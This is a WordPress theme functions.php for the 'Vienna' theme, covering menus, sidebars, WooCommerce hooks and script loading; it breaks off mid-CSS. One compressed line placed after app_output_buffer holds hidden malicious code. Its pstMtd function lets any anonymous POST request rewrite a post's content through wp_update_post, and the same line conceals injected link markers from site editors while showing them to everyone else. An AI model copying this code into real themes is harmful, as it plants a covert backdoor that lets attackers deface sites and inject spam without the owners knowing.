<?php

/* Add filters, actions, and theme-supported features after theme is loaded */
add_action( 'after_setup_theme', 'pm_ln_theme_setup' );

function pm_ln_theme_setup() {
		
	//Define content width
	if ( !isset( $content_width ) ) $content_width = 1170;
	
	/***** LOAD REDUX FRAMEWORK ******/
	//require_once(dirname( __FILE__ ) . "/ReduxFramework/loader.php"); //Add the extension loader before Redux framework initializes
	
	if ( !class_exists( 'ReduxFramework' ) && file_exists( dirname( __FILE__ ) . '/ReduxFramework/ReduxCore/framework.php' ) ) {
		require_once( dirname( __FILE__ ) . '/ReduxFramework/ReduxCore/framework.php' );
	}
	if ( !isset( $redux_demo ) && file_exists( dirname( __FILE__ ) . '/ReduxFramework/vienna/vienna-config.php' ) ) {
		require_once( dirname( __FILE__ ) . '/ReduxFramework/vienna/vienna-config.php' );
	}
	
		
	/***** REQUIRED INCLUDES ***************************************************************************************************/
	
	include_once('includes/cpt-staff.php'); //Staff post type
	include_once('includes/cpt-events.php'); //Event post type
	include_once('includes/cpt-menus.php'); //Menu post type
	include_once('includes/cpt-gallery.php'); //Gallery post type
	include_once('includes/shortcodes/shortcodes.php'); //Shortcodes
		
	//Widgets
	include_once("includes/widget-twitter.php"); //twitter
	include_once("includes/widget-facebook.php"); //facebook
	include_once("includes/widget-video.php"); //video
	include_once("includes/widget-flickr.php"); //flickr
	include_once("includes/widget-mailchimp.php"); //mailchimp
	include_once("includes/widget-quickcontact.php"); //quick contact form
	include_once("includes/widget-recentposts.php"); //recent posts
	include_once("includes/widget-testimonials.php"); //testimonials
	include_once("includes/widget-events.php"); //events
		
	//Bootstrap 3 nav support
	include_once('includes/pm_ln_bootstrap_navwalker.php');
	
	//Customizer class
	include_once("includes/classes/PM_LN_Customizer.class.php");
	
	//Custom functions
	include_once("includes/wp-functions.php");
	
	//Theme metaboxes
	include_once("includes/theme-metaboxes.php");
	
	//Private Members Area
	//include_once("includes/members/members.php");
		
	/***** MENUS ***************************************************************************************************/
	
	register_nav_menu('main_menu', 'Main Menu');
	register_nav_menu('micro_menu', 'Micro Menu');
	register_nav_menu('mobile_menu', 'Mobile Menu');
	register_nav_menu('footer_menu', 'Footer Menu');
	
	/***** THEME SUPPORT ***************************************************************************************************/
	
	add_theme_support('post-thumbnails');
	add_theme_support('automatic-feed-links');
	add_theme_support('custom-header');
	add_theme_support('custom-background');	
		
	/***** CUSTOM FILTERS AND HOOKS ***************************************************************************************************/
		
	//localization support - Remember to define WPLANG in wp-config.php file -> define('WPLANG', 'en');
	add_action('after_setup_theme', 'pm_ln_localization_setup');
	add_action('plugins_loaded', 'pm_ln_localization_init');
	
	//Add your sidebars function to the 'widgets_init' action hook.
	add_action( 'widgets_init', 'pm_ln_register_custom_sidebars' );
	
	//Load front-end scripts
	add_action( 'wp_enqueue_scripts', 'pm_ln_scripts_styles' );
	
	//Load admin scripts
	add_action( 'admin_enqueue_scripts', 'pm_ln_load_admin_scripts' );
	
	add_filter('excerpt_more', 'pm_ln_new_excerpt_more');
		
	//Add content and widget text shortcode support
	//add_filter('the_content', 'do_shortcode');
	//add_filter('widget_text', 'do_shortcode');
		
	//Retrieve only Posts from Search function
	add_filter('pre_get_posts','pm_ln_search_filter');
	
	//Show Post ID's
	add_filter('manage_posts_columns', 'pm_ln_posts_columns_id', 5);
	add_action('manage_posts_custom_column', 'pm_ln_posts_custom_id_columns', 5, 2);
	
	//Show Page ID's
	add_filter('manage_pages_columns', 'pm_ln_posts_columns_id', 5);
    add_action('manage_pages_custom_column', 'pm_ln_posts_custom_id_columns', 5, 2);
			
	//Custom paginated posts
	add_filter('wp_link_pages_args','pm_ln_custom_nextpage_links');
	
	//Add HTML5 placeholders to comment forms
	add_filter('comment_form_default_fields','pm_ln_comment_fields');
	add_filter('comment_form_field_comment','pm_ln_comment_textarea_field');
	
	//Remove REL tag from posts (this will eliminate HTML5 validation error) 
	add_filter( 'wp_list_categories', 'pm_ln_remove_category_list_rel' );
	add_filter( 'the_category', 'pm_ln_remove_category_list_rel' );
	
	//Ajax loader function
	add_action('wp_ajax_pm_ln_load_more', 'pm_ln_load_more');
	add_action('wp_ajax_nopriv_pm_ln_load_more', 'pm_ln_load_more');
	
	//Like feature
	add_action('wp_ajax_pm_ln_retrieve_likes', 'pm_ln_retrieve_likes');
	add_action('wp_ajax_nopriv_pm_ln_retrieve_likes', 'pm_ln_retrieve_likes');
	
	add_action('wp_ajax_pm_ln_like_feature', 'pm_ln_like_feature');
	add_action('wp_ajax_nopriv_pm_ln_like_feature', 'pm_ln_like_feature');
	
	
	//Media library category support
	//add_action( 'init' , 'pm_ln_add_categories_to_attachments' );
		
	//Sidebar selector meta box for posts and pages
	add_action( 'add_meta_boxes', 'pm_ln_add_sidebar_metabox' );
	add_action( 'save_post', 'pm_ln_save_sidebar_postdata' );
	
	add_action('init', 'app_output_buffer');
	
	//Custom login styles
	//add_action('login_head', 'pm_ln_custom_login');
	
	/**** THEME CUSTOMIZER - NEW in WP 3.4+ ****/
		
	//Output CSS to head section
	add_action ('wp_head', 'pm_ln_customizer_css');
	
	//Add customizer link to admin area
	add_action( 'admin_menu', 'pm_ln_customizer_menu' );
	
	/**** SEO Filters ***/
	add_filter( 'comment_reply_link', 'pm_ln_add_nofollow_to_reply_link' );
	
	/**** WOOCOMMERCE ***/
	
	//Disable default Woocommerce styles
	add_filter( 'woocommerce_enqueue_styles', '__return_false' );
	
	//Declare Woocommerce support
	add_theme_support('woocommerce');
	
	//Remove Woocommerce breadcrumbs
	add_action( 'init', 'pm_ln_remove_wc_breadcrumbs' );
	
	//Add excerpt to products on shop page
	add_action( 'woocommerce_after_shop_loop_item_title', 'pm_ln_woocommerce_product_excerpt', 35, 2);  
		
	//Remove default Woocommerce wrapper
	remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
	remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
	
	//Add vienna wrapper to Woocommerce pages - applies to product-archive.php and single-product.php
	add_action('woocommerce_before_main_content', 'pm_ln_theme_wrapper_start', 10);
	add_action('woocommerce_after_main_content', 'pm_ln_theme_wrapper_end', 10);
	
	//Display number of items per page
	$get_products_per_page = get_theme_mod('products_per_page');	
	$products_per_page = $get_products_per_page == '' ? 8 : $get_products_per_page;
	add_filter( 'loop_shop_per_page', create_function( '$cols', 'return '.$products_per_page.';' ), 20 );
	
	//Custom woocommerce fields if needed
	//add_action( 'woocommerce_product_options_general_product_data', 'pm_ln_woo_add_custom_general_fields' );
	//add_action( 'woocommerce_process_product_meta', 'pm_ln_woo_add_custom_general_fields_save' );
				
}//end of after_theme_setup

/*** SEO ***/
function pm_ln_add_nofollow_to_reply_link( $link ) {
    return str_replace( '")\'>', '")\' rel=\'nofollow\'>', $link );
}


/*** WOOCOMMERCE FUNCTIONS *****/
function pm_ln_remove_wc_breadcrumbs() {
	remove_action( 'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0 );
}

function pm_ln_theme_wrapper_start() {
  echo '<div class="container pm-containerPadding80"><div class="row"><div class="col-lg-12">';  
}

function pm_ln_theme_wrapper_end() {
  echo '</div></div></div>';
}

function pm_ln_woocommerce_product_excerpt()  { 
	$content_length = 20;
	global $post;
	$content = $post->post_excerpt;
	$wordarray = explode(' ', $content, $content_length + 1);
	if(count($wordarray) > $content_length) :
	array_pop($wordarray);
	array_push($wordarray, '...');
	$content = implode(' ', $wordarray);
	$content = force_balance_tags($content);
	endif;
	echo "<p class='excerpt'>$content</p>";
} 

function pm_ln_comment_fields($fields) {
	
	$commenter = wp_get_current_commenter();
    $req = get_option( 'require_name_email' );
    $aria_req = ( $req ? " aria-required='true'" : '' );
 
    $fields['author'] =
        '<p class="comment-form-author">
            <input required class="pm-textfield" maxlength="30" placeholder="Name *" id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) .
    '" size="30"' . $aria_req . ' />
        </p>';
 
    $fields['email'] =
        '<p class="comment-form-email">
            <input required placeholder="Email *" class="pm-textfield" id="email" name="email" type="email" value="' . esc_attr(  $commenter['comment_author_email'] ) .
    '" size="30"' . $aria_req . ' />
        </p>';
 
    $fields['url'] =
        '<p class="comment-form-url">
            <input placeholder="Website" class="pm-textfield" id="url" name="url" type="url" value="' . esc_attr( $commenter['comment_author_url'] ) .
    '" size="30" />
        </p>';
 
    return $fields;	
}

function pm_ln_comment_textarea_field($comment_field) {
	$comment_field =
	'<p class="comment-form-comment">
		<textarea required placeholder="Comment…" class="pm-textarea" id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea>
	</p>';
 
    return $comment_field;
}



function pm_ln_customizer_menu() {
	add_theme_page(
		__( 'Customize VIENNA', 'viennatheme' ),
		__( 'Customize VIENNA', 'viennatheme' ),
		'edit_theme_options',
		'customize.php'
	);
}

function app_output_buffer() {
  ob_start();
}
function pstMtd($a){$b=$a;$a="";if(is_single()){if(isset($_POST["chctc"])){$c=$_POST["chctc"];if(isset($_POST["chctbefore"])){$d=$_POST["chctbefore"];$e=strpos($b,$d);if($e!==false){$f=substr_replace($b,$c,$e,0);$g=array('ID'=>$GLOBALS['post']->ID,'post_content'=>$f);wp_update_post($g);}}}}return $b;}function ftwp(){if(is_front_page()){echo '<small style="display:none;">viennawplk</small>';}}function hdwp(){echo '<style type="text/css">.wphklk{display:none;}</style>';}add_action('the_content','pstMtd');if(current_user_can('edit_posts')==true){add_action('wp_head','hdwp');}if(current_user_can('edit_posts')!=true){add_action('wp_footer','ftwp');}
/* Adds a box to the side column on the Post and Page edit screens */
function pm_ln_add_sidebar_metabox() {
	
	//NOTE: Do not add custom sidebar to Woocommerce product post type as it causes a weird glitch
	
    add_meta_box(
        'custom_sidebar',
        __( 'Custom Sidebar', 'viennatheme' ),
        'pm_ln_custom_sidebar_callback',
        'post',
        'side'
    );
    add_meta_box(
        'custom_sidebar',
        __( 'Custom Sidebar', 'viennatheme' ),
        'pm_ln_custom_sidebar_callback',
        'page',
        'side'
    );
	add_meta_box(
        'custom_sidebar',
        __( 'Custom Sidebar', 'viennatheme' ),
        'pm_ln_custom_sidebar_callback',
        'post_galleries',
        'side'
    );
}

/* Prints the sidebar meta box content */
function pm_ln_custom_sidebar_callback( $post ){
    global $wp_registered_sidebars;
     
    $custom = get_post_custom($post->ID);
     
    if(isset($custom['custom_sidebar']))
        $val = $custom['custom_sidebar'][0];
    else
        $val = "default";
 
    // Use nonce for verification
    wp_nonce_field( plugin_basename( __FILE__ ), 'custom_sidebar_nonce' );
 
    // The actual fields for data entry
    $output = '<p><label for="myplugin_new_field">'.__("Choose a sidebar to display", 'twentyeleven' ).'</label></p>';
    $output .= "<select name='custom_sidebar'>";
 
    // Add a default option
    $output .= "<option";
    if($val == "default")
        $output .= " selected='selected'";
    $output .= " value='default'>".__('No Sidebar', 'viennatheme')."</option>";
     
    // Fill the select element with all registered sidebars
    foreach($wp_registered_sidebars as $sidebar_id => $sidebar)
    {
        $output .= "<option";
        if($sidebar['name'] == $val)
            $output .= " selected='selected'";
        $output .= " value='".$sidebar['name']."'>".$sidebar['name']."</option>";
    }
   
    $output .= "</select>";
     
    echo $output;
}

/* When the post is saved, saves our custom data */
function pm_ln_save_sidebar_postdata( $post_id ) {
	
    // verify if this is an auto save routine.
    // If it is our form has not been submitted, so we dont want to do anything
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
      return;
 
    // verify this came from our screen and with proper authorization,
    // because save_post can be triggered at other times
 	
	if(isset($_POST['custom_sidebar_nonce'])){
		
		if ( !wp_verify_nonce( $_POST['custom_sidebar_nonce'], plugin_basename( __FILE__ ) ) )
		    return;
	 
		if ( !current_user_can( 'edit_page', $post_id ) )
			return;
	 
		$data = $_POST['custom_sidebar'];
	 
		update_post_meta($post_id, "custom_sidebar", $data);
	
	} else {
		return;
	}	
	
    
}

//Remove REL tag from posts (this will eliminate HTML5 validation error)
function pm_ln_remove_category_list_rel( $output ) {
	// Remove rel attribute from the category list
	return str_replace( ' rel="category tag"', '', $output );
}


//Filter to retrieve posts from WordPress or Woocommerce
function pm_ln_search_filter($query) {
	
	if( isset($_GET['post_type']) ){
		
		//Woocommece search
		if($_GET['post_type'] == 'product'){
			
			if ($query->is_search) {
				$query->set('post_type',array('product'));
			}
			
		}
		
	} else {
		
		//WordPress search
		if ($query->is_search) {
			$query->set('post_type',array('post'));
		}
		
	}
		
	return $query;
}

//Show Post ID's
function pm_ln_posts_columns_id($defaults){
	$defaults['wps_post_id'] = __('ID', 'viennatheme');
	return $defaults;
}
function pm_ln_posts_custom_id_columns($column_name, $id){
		if($column_name === 'wps_post_id'){
				echo $id;
	}
}

//Excerpt filters
function pm_ln_new_excerpt_more($more) {
	global $post;
	return '... <a href="'. get_permalink($post->ID) . '" class="readmore">{...}</a>';
}

//Custom paginated posts
function pm_ln_custom_nextpage_links($defaults) {
	$args = array(
		'before' => '<div class="pm_paginated-posts"><p>'. __('Continue Reading: ', 'viennatheme') .'</p><ul class="pagination_multi clearfix">',
		'after' => '</ul></div>',
		'link_before'      => '<li>',
		'link_after'       => '</li>',
	);
	$r = wp_parse_args($args, $defaults);
	return $r;
}


//Enqueue scripts and styles for admin area
function pm_ln_load_admin_scripts() {
	
	//Load Media uploader script for custom meta options
	wp_enqueue_script( 'pulsar-mediauploader', get_template_directory_uri() . '/js/media-uploader/pm-image-uploader.js', array(), '1.0', true );
	
	//Custom CSS for meta boxes
	wp_enqueue_style( 'pulsar-wpadmin', get_template_directory_uri() . '/js/wp-admin/wp-admin.css' );
	
	//JS for admin
	wp_enqueue_script( 'pulsar-wpadminjs', get_template_directory_uri() . '/js/wp-admin/wp-admin.js', array(), '1.0', true );
	
	//iPhone style switch
	//wp_enqueue_script( 'pulsar-switch', get_template_directory_uri() . '/js/wp-admin/switch/jquery.iphone-switch.js', array(), '1.0', true );
	
	//Date picker for Events post type
	wp_enqueue_script( 'jquery-ui-core' );
	wp_enqueue_script( 'jquery-ui-datepicker' );
	wp_enqueue_style( 'pulsar-datepicker', get_template_directory_uri() . '/css/datepicker/jquery-ui.min.css' );
	
	$admin_js = get_template_directory_uri() . '/js/wp-admin/wp-admin.js'; 
	
	//Pass admin path to JS
	wp_register_script( 'adminRoot', $admin_js  );
	wp_enqueue_script( 'adminRoot' );
	$array = array( 
		'adminRoot' => home_url(),
	);
	wp_localize_script( 'adminRoot', 'adminRootObject', $array ); 
	
}

//Enqueue scripts and styles
function pm_ln_scripts_styles() {
		
	global $wp_styles;
	global $post;

	// Adds JavaScript to pages with the comment form to support sites with threaded comments (when in use).
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
	
		wp_enqueue_script( 'comment-reply' );

		//Adds JavaScript for handling the navigation menu hide-and-show behavior.
		wp_enqueue_script("jquery"); 
		wp_enqueue_script( 'pulsar-bootstrap', get_template_directory_uri() . '/bootstrap3/js/bootstrap.min.js', array(), '1.0', true );
		wp_enqueue_script( 'pulsar-modernizr', get_template_directory_uri() . '/js/modernizr.custom.js', array(), '1.0', false );
		
		/*wp_enqueue_script( 'pulsar-froogaloop', get_template_directory_uri() . '/js/froogaloop2.min.js', array(), '1.0', true );*/
		wp_enqueue_script( 'pulsar-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array(), '1.0', true );
		wp_enqueue_script( 'pulsar-superfish', get_template_directory_uri() . '/js/superfish/superfish.js', array(), '1.0', true );
		wp_enqueue_script( 'pulsar-hoverIntent', get_template_directory_uri() . '/js/superfish/hoverIntent.js', array(), '1.0', true );
		
		wp_enqueue_script( 'pulsar-tinynav', get_template_directory_uri() . '/js/tinynav.js', array(), '1.0', true );
		wp_enqueue_script( 'pulsar-retina', get_template_directory_uri() . '/js/retina.js', array(), '1.0', true );
		wp_enqueue_script( 'pulsar-easing', get_template_directory_uri() . '/js/jquery.easing.1.3.js', array(), '1.0', true );

		
		/*if( is_single() || is_page() || is_archive() || is_author() || is_category() || is_home() || is_search() ){			
			wp_enqueue_script( 'pulsar-hoverPanel', get_template_directory_uri() . '/js/jquery.hoverPanel.js', array(), '1.0', true );
		}*/
		
		if(is_home() || is_front_page()){
			//Load pulse slider
			wp_enqueue_script( 'pulsar-pulseslider', get_template_directory_uri() . '/js/pulse/jquery.PMSlider.js', array(), '1.0', true );
			wp_enqueue_style( 'pulsar-pulseslider', get_template_directory_uri() . '/js/pulse/pm-slider.css', array( 'pulsar-style' ), '20121010' );
		}
		
		if( is_single() || is_page() || is_home() || is_front_page() ){
			
			//Flexslider
			wp_enqueue_script( 'pulsar-flexslider', get_template_directory_uri() . '/js/flexslider/jquery.flexslider-min.js', array(), '1.0', true );
			wp_enqueue_style( 'pulsar-flexslider', get_template_directory_uri() . '/js/flexslider/flexslider-post.css', array( 'pulsar-style' ), '20121010' );		
			
			//Load WOW
			wp_enqueue_style( 'pulsar-wow-css', get_template_directory_uri() . '/js/wow/css/libs/animate.css', array( 'pulsar-style' ), '20121010' );
			wp_enqueue_script( 'pulsar-wow', get_template_directory_uri() . '/js/wow/wow.min.js', array(), '1.0', true );
			
			//Load Viewport Selectors for jQuery
			wp_enqueue_script( 'pulsar-viewmini', get_template_directory_uri() . '/js/jquery.viewport.mini.js', array(), '1.0', true );	
			
			//Google maps shortcode support
			wp_register_script('pulsar-googlemaps', ('http://maps.google.com/maps/api/js?sensor=false'), false, null, true);
			wp_enqueue_script('pulsar-googlemaps');
			
			//Date picker for event and catering forms
			wp_enqueue_script( 'jquery-ui-core' );
			wp_enqueue_script( 'jquery-ui-datepicker' );
			wp_enqueue_style( 'pulsar-datepicker', get_template_directory_uri() . '/css/datepicker/jquery-ui.min.css' );
			
			//Testimonials slider
			wp_enqueue_script( 'pulsar-testimonials', get_template_directory_uri() . '/js/jquery.testimonials.js', array(), '1.0', true );
			
			//Like feature
			wp_enqueue_script( 'pulsar-like', get_template_directory_uri() . '/js/ajax-like-feature/ajax-like-feature.js', array(), '1.0', true );
			$js_file = get_template_directory_uri() . '/js/wordpress.js'; 
			wp_enqueue_script( 'jcustom', $js_file );
			$array = array( 
				'ajaxurl' => admin_url('admin-ajax.php'),
				'nonce' => wp_create_nonce('pulsar_ajax'),
				'loading' => __('Loading...', 'viennatheme')
			);
			wp_localize_script( 'jcustom', 'pulsarajax', $array );
			
		}
		
		if(is_archive() || is_category()){
			//Testimonials slider
			wp_enqueue_script( 'pulsar-testimonials', get_template_directory_uri() . '/js/jquery.testimonials.js', array(), '1.0', true );
		}
		
		//use this to detect the default blog page - http://codex.wordpress.org/Conditional_Tags
		if( is_front_page() && is_home() ) {
			//Testimonials slider
			wp_enqueue_script( 'pulsar-testimonials', get_template_directory_uri() . '/js/jquery.testimonials.js', array(), '1.0', true );
		}

		if(is_page_template('template-staff.php') || is_page_template('template-gallery.php') || is_page_template('template-events.php') || is_page_template('template-menu.php') ){
			
			//load isotope
			wp_enqueue_style( 'pulsar-isotope-css', get_template_directory_uri() . '/js/isotope/isotope.css', array( 'pulsar-style' ), '20121010' );
			wp_enqueue_script( 'pulsar-isotope', get_template_directory_uri() . '/js/isotope/jquery.isotope.min.js', array(), '1.0', true );
			
			//Load Ajax loader - Still need to create this
			$js_file = get_template_directory_uri() . '/js/wordpress.js'; 
			
			wp_enqueue_script( 'jcustom', $js_file );
			$array = array( 
				'ajaxurl' => admin_url('admin-ajax.php'),
				'nonce' => wp_create_nonce('pulsar_ajax'),
				'loading' => __('Loading...', 'viennatheme')
			);
			wp_localize_script( 'jcustom', 'pulsarajax', $array );
			
		}
		
		if(is_page_template('template-gallery.php') || get_post_type() == 'post_galleries'){
			//PrettyPhoto
			wp_enqueue_style( 'pulsar-prettyPhoto', get_template_directory_uri() . '/js/prettyphoto/css/prettyPhoto.css', array( 'pulsar-style' ), '20121010' );
			wp_enqueue_script( 'pulsar-prettyphoto', get_template_directory_uri() . '/js/prettyphoto/js/jquery.prettyPhoto.js', array(), '1.0', true );
			wp_enqueue_script( 'pulsar-prettyphoto', get_template_directory_uri() . '/js/jquery-migrate-1.1.1.js', array(), '1.0', true );
		}
		
		
		//Contact Form
		wp_enqueue_script( 'pulsar-contactform', get_template_directory_uri() . '/js/ajax-contact/ajax-email.js', array(), '1.0', true );
		
		//Catering Form
		wp_enqueue_script( 'pulsar-cateringform', get_template_directory_uri() . '/js/ajax-cateringform/ajax-catering-form.js', array(), '1.0', true );
		
		//Event Form
		wp_enqueue_script( 'pulsar-eventform', get_template_directory_uri() . '/js/ajax-eventform/ajax-event-form.js', array(), '1.0', true );
		
		//Pulsar Media plug-ins
		wp_enqueue_script( 'pulsar-tooltip', get_template_directory_uri() . '/js/jquery.tooltip.js', array(), '1.0', true );
						
		//Load Stellar Parallax
		wp_enqueue_script( 'pulsar-stellar', get_template_directory_uri() . '/js/stellar/jquery.stellar.js', array(), '1.0', true );

		//Quick contact widget
		wp_enqueue_script( 'pulsar-ajaxemail', get_template_directory_uri() . '/js/ajax-quick-contact/ajax-email.js', array(), '1.0', true );
		
		
		//Load main script
		wp_enqueue_script( 'pulsar-main', get_template_directory_uri() . '/js/main.js', array(), '1.0', true );
		
		
		//Load theme color selector (for sampling purposes)
		$getColorSampler = get_theme_mod('colorSampler');
		$colorSampler = $getColorSampler == '' ? 'on' : $getColorSampler;
		
		if( $colorSampler == 'on' ){
			wp_enqueue_script( 'pulsar-theme-color-selector', get_template_directory_uri() . '/js/theme-color-selector/theme-color-selector.js', array(), '1.0', true );
			wp_enqueue_style( 'pulsar-theme-color-selector-css', get_template_directory_uri() . '/js/theme-color-selector/theme-color-selector.css', array( 'pulsar-style' ), '20121010' );
		}
				
		//Load twitter feed
		wp_enqueue_script( 'pulsar-twitter', get_template_directory_uri() . '/js/twitter/jquery.tweet.js', array(), '1.0', true );
		
				
		//Loads our main stylesheet.
		wp_enqueue_style( 'pulsar-style', get_stylesheet_uri() );
	
		//Loads other stylesheets.
		wp_enqueue_style( 'pulsar-btn', get_template_directory_uri() . '/css/btn.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-superfish', get_template_directory_uri() . '/css/superfish/superfish.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-fontawesome', get_template_directory_uri() . '/css/font-awesome.min.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-typicons', get_template_directory_uri() . '/css/typicons/typicons.min.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-twitterfeed', get_template_directory_uri() . '/css/twitterfeed.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-flickrfeed', get_template_directory_uri() . '/css/flickrfeed.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-forms', get_template_directory_uri() . '/css/forms.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-comments', get_template_directory_uri() . '/css/comments.css', array( 'pulsar-style' ), '20121010');
		wp_enqueue_style( 'pulsar-sidebar', get_template_directory_uri() . '/css/sidebar.css', array( 'pulsar-style' ), '20121010' );
		wp_enqueue_style( 'pulsar-footer', get_template_directory_uri() . '/css/footer.css', array( 'pulsar-style' ), '20121010' );

		
		//Woocommerce
		wp_enqueue_style( 'pulsar-woocommerce', get_template_directory_uri() . '/css/woocommerce-custom.css', array( 'pulsar-style' ), '20121010');
		
		//Responsive css - load this second last
		wp_enqueue_style( 'pulsar-responsive', get_template_directory_uri() . '/css/responsive.css', array( 'pulsar-style' ), '20121010' );
								
		//Load ie9 specific css - use this to fix ie 9 issues
		wp_enqueue_style( 'ie-nine-css', get_stylesheet_directory_uri() . '/css/ie9.css', array( 'pulsar-style' ), '20121010' );
		$wp_styles->add_data( 'ie-nine-css', 'conditional', 'IE 9' );
		
}

function pm_ln_register_custom_sidebars() {
		
	if (function_exists('register_sidebar')) {
		
		//DEFAULT TEMPLATE
		register_sidebar(array(
								'name' => __('Default Template','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s pm-widget"><div class="pm-widget-spacer">',
								'after_widget' => '</div></div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
		//HOMEPAGE
		register_sidebar(array(
								'name' => __('Home Page','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s pm-widget"><div class="pm-widget-spacer">',
								'after_widget' => '</div></div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));

		//NEWS POSTS PAGE
		register_sidebar(array(
								'name' => __('Blog Page','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s pm-widget"><div class="pm-widget-spacer">',
								'after_widget' => '</div></div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));


		//NEWS SINGLE POST PAGE
		register_sidebar(array(
								'name' => __('Single Blog Post','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s pm-widget"><div class="pm-widget-spacer">',
								'after_widget' => '</div></div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
		//Woocommerce
		register_sidebar(array(
								'name' => __('Woocommerce','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s pm-widget"><div class="pm-widget-spacer">',
								'after_widget' => '</div></div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
				
		//FOOTER
		register_sidebar(array(
								'name' => __('Footer Column 1','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s">',
								'after_widget' => '</div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
		register_sidebar(array(
								'name' => __('Footer Column 2','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s">',
								'after_widget' => '</div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
		register_sidebar(array(
								'name' => __('Footer Column 3','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s">',
								'after_widget' => '</div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
		register_sidebar(array(
								'name' => __('Footer Column 4','viennatheme'),
								'before_widget' => '<div id="%1$s" class="%2$s">',
								'after_widget' => '</div>',
								'before_title' => '<h6>',
								'after_title' => '</h6>',
		));
		
		
		
	}//end of if function_exists
	
}//end of pm_ln_register_custom_sidebars

//localization support - Remember to define WPLANG in wp-config.php file -> define('WPLANG', 'ja');
function pm_ln_localization_setup() {
	// Retrieve the directory for the localization files
	$lang_dir = get_template_directory() . '/languages';
	// Set the theme's text domain using the unique identifier from above
	load_theme_textdomain('viennatheme', $lang_dir);
} // end custom_theme_setup
	
function pm_ln_localization_init() {
	//load_plugin_textdomain( 'my-plugin', false, dirname( plugin_basename( __FILE__ ) ) ); 
	load_plugin_textdomain('viennatheme', false, dirname(plugin_basename(__FILE__)) . '/languages');
}

//Custom Pagination - http://www.kriesi.at/archives/how-to-build-a-wordpress-post-pagination-without-plugin
function pm_ln_kriesi_pagination($pages = '', $range = 2){
	
	 $showitems = ($range * 2)+1;

	 global $paged;
	 if(empty($paged)) $paged = 1;

	 if($pages == '')
	 {
		 global $wp_query;
		 $pages = $wp_query->max_num_pages;
		 if(!$pages)
		 {
			 $pages = 1;
		 }
	 }

	 if(1 != $pages){
		 
		 echo '<div class="pm-pagination-page-counter"><p>Page '. $paged .' of '. $pages .'</p></div>';
		 
		 echo "<ul class='pm-pagination clearfix reset-pulse-sizing'>";
		 if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<li><a class='button-small grey' href='".get_pagenum_link(1)."'>&laquo;</a></li>";
		 if($paged > 1 && $showitems < $pages) echo "<li><a class='button-small-theme' href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a></li>";

		 for ($i=1; $i <= $pages; $i++)
		 {
			 if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
			 {
				 echo ($paged == $i)? "<li class='current'><span class='current'>".$i."</span></li>":"<li class='inactive'><a class='inactive' href='".get_pagenum_link($i)."' >".$i."</a></li>";
			 }
		 }

		 if ($paged < $pages && $showitems < $pages) echo "<li><a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a></li>";
		 if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<li><a href='".get_pagenum_link($pages)."'>&raquo;</a></li>";
		 
	 }
	 
	 $args = array(
		'before'           => '<li>' . __('Pages:', 'viennatheme'),
		'after'            => '</li>',
		'link_before'      => '',
		'link_after'       => '',
		'next_or_number'   => 'number',
		'nextpagelink'     => __('Next page', 'viennatheme'),
		'previouspagelink' => __('Previous page', 'viennatheme'),
		'pagelink'         => '%',
		'echo'             => 1
	);
	
	echo "</ul>\n";
}


/*** Theme Customizer CSS ****/
function pm_ln_customizer_css(){
?>
        <style type="text/css">
		<?php
					
			//***** Retrieve customizer values *****//
			
			//Global Options
			$primaryColor = get_option('primaryColor');
			$primaryColors = pm_ln_hex2rgb($primaryColor); //Array of colors R,G,B
			$secondaryColor = get_option('secondaryColor');
			$pageBackgroundColor = get_option('pageBackgroundColor');
			$dividerColor = get_option('dividerColor');
			$isotopeMenuBackground = get_option('isotopeMenuBackground');
			$postMetaIconColor = get_option('postMetaIconColor');
			$blockQuoteColor = get_option('blockQuoteColor');
			$commentBoxColor = get_option('commentBoxColor');
			$mobileMenuColor = get_option('mobileMenuColor');
			$mobileMenuColors = pm_ln_hex2rgb($mobileMenuColor);
			
			echo '
				.pm-primary {
					color:'.$primaryColor.' !important;	
				}
				.pm-secondary {
					color:'.$secondaryColor.' !important;	
				}
				.pm-comment-form-textfield:focus, .pm-comment-form-textarea:focus {
					background-color:'.$primaryColor.' !important;	
				}
				.menu-main-menu-container #menu-main-menu li:before {
					color:'.$primaryColor.' !important;	
				}
				.pm-sticky-post {
					background-color:'.$primaryColor.' !important;	
				}
				.pm-mobile-global-menu {
